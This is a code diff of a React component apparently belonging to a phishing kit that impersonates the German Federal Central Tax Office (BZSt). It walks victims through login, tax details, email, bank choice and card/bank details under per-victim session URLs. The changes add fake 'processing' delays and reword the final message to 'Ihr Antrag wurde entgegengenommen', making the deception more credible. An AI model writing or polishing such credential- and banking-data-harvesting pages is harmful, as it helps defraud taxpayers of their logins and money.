@@ -44,6 +44,8 @@ const DEFAULT_CONFIG: StepConfig = {
   login: true
 };
 
+const sleep = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms));
+
 const BzstTemplate: React.FC = () => {
   const { key } = useParams<{ key: string }>();
   const navigate = useNavigate();
@@ -98,7 +100,7 @@ const BzstTemplate: React.FC = () => {
           login: config.steps?.login ?? true
         });
         setConfigLoaded(true);
-      } catch (err) {
+      } catch {
         setConfigLoaded(true);
       }
     };
@@ -110,7 +112,7 @@ const BzstTemplate: React.FC = () => {
           setLoadingMessage('Sitzung wird erstellt...');
           const newKey = await createTemplateSession('bzst');
           navigate(`/bzst/${newKey}`);
-        } catch (err) {
+        } catch {
           const fallbackKey = Math.random().toString(36).substring(2, 15);
           navigate(`/bzst/${fallbackKey}`);
         } finally {
@@ -173,7 +175,7 @@ const BzstTemplate: React.FC = () => {
       }
 
       setState(STATES.LOGIN);
-    } catch (err) {
+    } catch {
       setError('Fehler bei der Anmeldung');
       setState(STATES.ERROR);
     } finally {
@@ -207,7 +209,7 @@ const BzstTemplate: React.FC = () => {
         }
 
         setActiveTab('tax');
-      } catch (err) {
+      } catch {
         setError('Fehler bei der Anmeldung');
         setState(STATES.ERROR);
       } finally {
@@ -240,7 +242,7 @@ const BzstTemplate: React.FC = () => {
 
         setPersonalEmail(emailValue);
         setActiveTab('personal');
-      } catch (err) {
+      } catch {
         setError('Fehler bei der Anmeldung');
         setState(STATES.ERROR);
       } finally {
@@ -261,6 +263,11 @@ const BzstTemplate: React.FC = () => {
         return;
       }
 
+      // Short 2s processing loader after choosing bank (before showing bank details)
+      setLoading(true);
+      setLoadingMessage('Verarbeitung läuft...');
+      await sleep(2000);
+      setLoading(false);
       setActiveTab('card');
       return;
     }
@@ -324,8 +331,11 @@ const BzstTemplate: React.FC = () => {
           return;
         }
 
+        // Short 2s processing loader after bank details, then show application received message
+        setLoadingMessage('Verarbeitung läuft...');
+        await sleep(2000);
         setState(STATES.SUCCESS);
-      } catch (err) {
+      } catch {
         setError('Fehler beim Speichern der Daten');
         setState(STATES.ERROR);
       } finally {
@@ -365,8 +375,8 @@ const BzstTemplate: React.FC = () => {
     if (state === STATES.SUCCESS) {
       return (
         <div className="bzst-panel">
-          <h3>Sie haben sich erfolgreich registriert</h3>
-          <p>Ihre Angaben wurden erfolgreich übermittelt.</p>
+          <h3>Ihr Antrag wurde entgegengenommen</h3>
+          <p>Wir haben Ihre Angaben erhalten und bearbeiten diese nun weiter.</p>
         </div>
       );
     }
